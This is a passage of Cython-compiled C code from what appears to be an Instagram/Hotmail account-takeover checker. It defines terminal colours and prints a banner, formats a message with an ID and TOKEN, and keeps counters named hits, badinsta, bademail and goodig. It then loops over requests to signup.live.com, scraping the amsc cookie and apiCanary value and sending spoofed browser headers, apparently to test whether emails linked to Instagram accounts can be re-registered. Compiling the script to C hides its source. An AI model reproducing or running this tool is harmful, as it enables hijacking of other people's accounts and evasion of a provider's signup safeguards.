  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_18, 7, __pyx_t_11);
  __pyx_t_11 = 0;
  __Pyx_INCREF(__pyx_kp_u_HIS_ID);
  __pyx_t_6 += 11;
  __Pyx_GIVEREF(__pyx_kp_u_HIS_ID);
  PyTuple_SET_ITEM(__pyx_t_18, 8, __pyx_kp_u_HIS_ID);
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_ID); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
  __Pyx_GIVEREF(__pyx_t_17);
  PyTuple_SET_ITEM(__pyx_t_18, 9, __pyx_t_17);
  __pyx_t_17 = 0;
  __Pyx_INCREF(__pyx_kp_u_TOKEN);
  __pyx_t_6 += 11;
  __Pyx_GIVEREF(__pyx_kp_u_TOKEN);
  PyTuple_SET_ITEM(__pyx_t_18, 10, __pyx_kp_u_TOKEN);
  __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_token); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_18, 11, __pyx_t_11);
  __pyx_t_11 = 0;
  __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_18, 12, __pyx_t_6, __pyx_t_14); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_t_11); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 267, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_os); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 270, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 270, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_tuple__85, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 270, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1m_31m) < 0) __PYX_ERR(0, 271, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_green, __pyx_kp_u_1m_32m) < 0) __PYX_ERR(0, 272, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yellow, __pyx_kp_u_1m_33m) < 0) __PYX_ERR(0, 273, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_blue, __pyx_kp_u_1m_34m) < 0) __PYX_ERR(0, 274, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cyan, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 275, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_magenta, __pyx_kp_u_1m_35m) < 0) __PYX_ERR(0, 276, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 277, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_white, __pyx_kp_u_1m_37m) < 0) __PYX_ERR(0, 278, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_orange, __pyx_kp_u_1m_38_5_208m) < 0) __PYX_ERR(0, 279, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_reset, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 280, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 281, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 282, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 283, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 284, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 285, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 286, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 287, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 288, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 289, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 290, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_HH, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 291, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 292, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_1_30m) < 0) __PYX_ERR(0, 293, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 294, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 295, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 296, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Bl, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 297, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_P, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 298, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 299, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_N, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 300, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 301, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 302, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 303, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_J, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 304, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_I, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 305, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 306, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_H, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 307, __pyx_L1_error)

  
  __pyx_t_18 = PyTuple_New(4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_6 = 0;
  __pyx_t_14 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_green); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_19);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
  __Pyx_GIVEREF(__pyx_t_19);
  PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_t_19);
  __pyx_t_19 = 0;
  __Pyx_INCREF(__pyx_kp_u_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O);
  __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
  __pyx_t_6 += 138;
  __Pyx_GIVEREF(__pyx_kp_u_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O);
  PyTuple_SET_ITEM(__pyx_t_18, 1, __pyx_kp_u_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O);
  __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_red); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_19);
  __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_19, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_18, 2, __pyx_t_11);
  __pyx_t_11 = 0;
  __Pyx_INCREF(__pyx_kp_u__106);
  __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
  __pyx_t_6 += 1596;
  __Pyx_GIVEREF(__pyx_kp_u__106);
  PyTuple_SET_ITEM(__pyx_t_18, 3, __pyx_kp_u__106);
  __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_18, 4, __pyx_t_6, __pyx_t_14); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __pyx_t_18 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_11); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_aca, __pyx_int_0) < 0) __PYX_ERR(0, 342, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_int_0) < 0) __PYX_ERR(0, 343, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_badinsta, __pyx_int_0) < 0) __PYX_ERR(0, 344, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_int_0) < 0) __PYX_ERR(0, 345, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_goodig, __pyx_int_0) < 0) __PYX_ERR(0, 346, __pyx_L1_error)

  
  while (1) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_9, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_8);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 350, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 350, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
          }
        }
        __pyx_t_18 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_19, __pyx_t_11, __pyx_kp_u_https_signup_live_com_signup) : __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_kp_u_https_signup_live_com_signup);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 350, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_res, __pyx_t_18) < 0) __PYX_ERR(0, 350, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_res); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_cookies); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_19 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_19, __pyx_n_s_get); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        __pyx_t_19 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_18 = (__pyx_t_19) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_19, __pyx_n_u_amsc) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_n_u_amsc);
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_amsc, __pyx_t_18) < 0) __PYX_ERR(0, 351, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_res); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_text); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
          }
        }
        __pyx_t_17 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_12, __pyx_kp_u_apiCanary) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_u_apiCanary);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = __Pyx_GetItemInt(__pyx_t_17, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
          }
        }
        __pyx_t_19 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_16, __pyx_kp_u__27) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_u__27);
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

        
        __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_19, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 353, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_encode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 353, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
          }
        }
        __pyx_t_11 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_19);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 353, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_decode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 353, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_19))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_19);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_19, function);
          }
        }
        __pyx_t_18 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_19, __pyx_t_11, __pyx_n_u_unicode_escape) : __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_n_u_unicode_escape);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 353, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_canary, __pyx_t_18) < 0) __PYX_ERR(0, 352, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __pyx_t_18 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 355, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_amsc); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 355, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_amsc, __pyx_t_19) < 0) __PYX_ERR(0, 355, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_cookies, __pyx_t_18) < 0) __PYX_ERR(0, 354, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __pyx_t_18 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 358, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_authority, __pyx_kp_u_signup_live_com) < 0) __PYX_ERR(0, 358, __pyx_L20_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_accept, __pyx_kp_u_application_json) < 0) __PYX_ERR(0, 358, __pyx_L20_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_canary); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 360, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_canary, __pyx_t_19) < 0) __PYX_ERR(0, 358, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_origin, __pyx_kp_u_https_signup_live_com) < 0) __PYX_ERR(0, 358, __pyx_L20_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_referer, __pyx_kp_u_https_signup_live_com_signup_lic_2) < 0) __PYX_ERR(0, 358, __pyx_L20_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_10_K_A) < 0) __PYX_ERR(0, 358, __pyx_L20_error)
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_headers, __pyx_t_18) < 0) __PYX_ERR(0, 357, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __pyx_t_18 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 367, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);

        
        __pyx_t_19 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 369, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        if (PyDict_SetItem(__pyx_t_19, __pyx_n_u_parallax, __pyx_n_u_enablejspublickeydeprecationexpe) < 0) __PYX_ERR(0, 369, __pyx_L20_error)
        if (PyDict_SetItem(__pyx_t_19, __pyx_n_u_control, __pyx_n_u_enablejspublickeydeprecationexpe_2) < 0) __PYX_ERR(0, 369, __pyx_L20_error)

        
        __pyx_t_11 = PyList_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 371, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_INCREF(__pyx_n_u_enablejspublickeydeprecationexpe_3);
        __Pyx_GIVEREF(__pyx_n_u_enablejspublickeydeprecationexpe_3);
        PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_u_enablejspublickeydeprecationexpe_3);
